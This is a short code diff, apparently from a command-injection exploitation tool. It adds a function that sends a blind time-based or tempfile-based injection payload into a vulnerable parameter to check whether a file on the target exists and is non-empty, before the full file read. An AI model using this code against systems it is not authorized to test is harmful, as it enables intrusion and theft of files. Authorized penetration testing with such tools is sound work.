@@ -2953,6 +2953,22 @@ def file_content_to_read():
   return cmd, file_to_read
 
 """
+Cheap pre-check for file existence/non-emptiness before full extraction.
+"""
+def file_readable(separator, timesec, http_request_method, url, vuln_parameter, whitespace, prefix, suffix, url_time_response, file_to_read, technique):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return True
+  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
+  else:
+    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
+  payload = payloads.condition_check(separator, "-s " + file_to_read, timesec, http_request_method)
+  if payload is None:
+    return True
+  exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+  return time_related_shell(url_time_response, exec_time, timesec)
+
+"""
 File read status
 """
 def file_read_status(shell, file_to_read, filename):
